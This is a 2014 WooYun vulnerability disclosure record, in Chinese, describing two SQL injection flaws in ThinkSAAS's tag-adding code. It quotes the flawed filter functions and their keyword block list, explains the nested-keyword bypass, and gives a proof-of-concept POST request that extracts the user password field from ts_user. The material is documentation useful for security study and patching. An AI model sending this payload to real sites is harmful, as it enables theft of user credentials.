{"id": 57769, "wybug_id": "wooyun-2014-053384", "wybug_title": "ThinkSAAS最新版绕过过滤继续注入2处", "wybug_corp": "thinksaas.cn", "wybug_author": "xfkxfk", "wybug_date": "2014-03-11 23:13", "wybug_open_date": "2014-06-09 23:13", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-09：\t细节向公众公开  简要描述： ThinkSAAS最新版绕过过滤继续注入2处无视gpc，无需登录 详细说明：  之前这个漏洞有\t′ 雨。分析过： WooYun: Thinksaas某处绕过过滤的注射漏洞 现在官方有最新版，做了修改，加了过滤，但是过滤不严格，可以绕过继续注入。第一处：现在最新的代码/app/tag/action/add_ajax.php\ncase \"do\":\t\t\t$objname = t($_POST['objname']);\t\t$idname = tsFilter(t($_POST['idname']));\t\t$objid = t($_POST['objid']);\t\t$tags = t($_POST['tags']);\t\t\t\t$new['tag']->addTag($objname,$idname,$objid,$tags);\t\t\t\techo \"<script language=JavaScript>parent.window.location.reload();</script>\";\t\t\tbreak;\n在原来的$idname = t($_POST['idname']);基础上加了过滤函数tsFilter这里进行了双层过滤，t过滤了很多字符，而tsFilter过滤注入关键字。\nfunction t($text) {\t$text = preg_replace ( '/\\[.*?\\]/is', '', $text );\t$text = cleanJs ( $text );\t// 彻底过滤空格BY QINIAO\t$text = preg_replace ( '/\\s(?=\\s)/', '', $text );\t$text = preg_replace ( '/[\\n\\r\\t]/', ' ', $text );\t$text = str_replace ( '  ', ' ', $text );\t// $text = str_replace ( ' ', '', $text );\t$text = str_replace ( '&nbsp;', '', $text );\t$text = str_replace ( '&', '', $text );\t$text = str_replace ( '=', '', $text );\t$text = str_replace ( '-', '', $text );\t$text = str_replace ( '#', '', $text );\t$text = str_replace ( '%', '', $text );\t$text = str_replace ( '!', '', $text );\t$text = str_replace ( '@', '', $text );\t$text = str_replace ( '^', '', $text );\t$text = str_replace ( '*', '', $text );\t$text = str_replace ( 'amp;', '', $text );\t\t$text = str_replace ( 'position', '', $text );\t\t$text = strip_tags ( $text );\t$text = htmlspecialchars ( $text );\t$text = str_replace ( \"'\", \"\", $text );\treturn $text;}\n过滤字符的。\nfunction tsFilter($value){\t$value = trim($value);\t//定义不允许提交的SQl命令和关键字\t$words = array();\t$words[] = \"add \";\t$words[] = \"and \";\t$words[] = \"count \";\t$words[] = \"order \";\t$words[] = \"table \";\t$words[] = \"by \";\t$words[] = \"create \";\t$words[] = \"delete \";\t$words[] = \"drop \";\t$words[] = \"from \";\t$words[] = \"grant \";\t$words[] = \"insert \";\t$words[] = \"select \";\t$words[] = \"truncate \";\t$words[] = \"update \";\t$words[] = \"use \";\t$words[] = \"--\";\t$words[] = \"#\";\t$words[] = \"group_concat\";\t$words[] = \"column_name\";\t$words[] = \"information_schema.columns\";\t$words[] = \"table_schema\";\t$words[] = \"union \";\t$words[] = \"where \";\t$words[] = \"alert\";\t$value = strtolower($value);//转换为小写\tforeach($words as $word){\t\tif(strstr($value,$word)){\t\t\t$value = str_replace($word,'',$value);\t\t}\t}\t\treturn $value;}\n过滤注入关键字。通过t函数我们可以不用这里面的这些字符就是了。而tsFilter我们可以将“select”改为“selselect ect”,就可以绕过过滤。下面来看看addTag函数进行添加标签处理的：\nfunction addTag($objname,$idname,$objid,$tags){\t  \t\t......$tagIndexCount = $this->findCount('tag_'.$objname.'_index',array(\t\t\t\t\t\t\t$idname=>$objid,\t\t\t\t\t\t\t'tagid'=>$tagid,\t\t\t\t\t\t));\n在这里$idname 做了key，带入findCount函数。\npublic function findCount($table, $conditions = null) {\t\t$where = \"\";\t\tif (is_array ( $conditions )) {\t\t\t$join = array ();\t\t\tforeach ( $conditions as $key => $condition ) {\t\t\t\t$condition = $this->escape ( $condition );\t\t\t\t$join [] = \"{$key} = {$condition}\";\t\t\t}\t\t\t$where = \"WHERE \" . join ( \" AND \", $join );\t\t} else {\t\t\tif (null != $conditions)\t\t\t\t$where = \"WHERE \" . $conditions;\t\t}\t\t$sql = \"SELECT COUNT(*) AS ts_counter FROM \" . dbprefix . \"{$table} {$where}\";\t\t$result = $this->db->once_fetch_assoc ( $sql );\t\t\t\treturn $result ['ts_counter'];\t}\n这里只是对value做了过滤，但是key没有过滤。通过上面的绕过过滤，以及下面的分析，可以直接注入了。第二处注入在add.php文件\ncase \"do\":\t\t\t$objname = tsFilter($_POST['objname']);\t\t$idname = tsFilter($_POST['idname']);\t\t$objid = intval($_POST['objid']);\t\t$tags = t($_POST['tags']);\t\t\t\t$new['tag']->addTag($objname,$idname,$objid,$tags);\t\t\t\ttsNotice('标签添加成功！');\t\t\tbreak;\n同样是进行addtag，但是这里没有t函数，只有一个tsFilter函数进行过滤，注入起来更容易了。其他跟上面第一处注入是过程一样的。   漏洞证明：  发送请求：链接：http://localhost/thinksaas/index.php?app=tag&ac=add_ajax&ts=doPOST：objid=111111&objname=article&idname=111 uniunion on seleselect ct pwd frfrom om ts_user limit 1,1;a&tags=idname\n\n\n\n   修复方案：  严格过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-12 13:57 厂商回复： 感谢提交，正在修复... 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}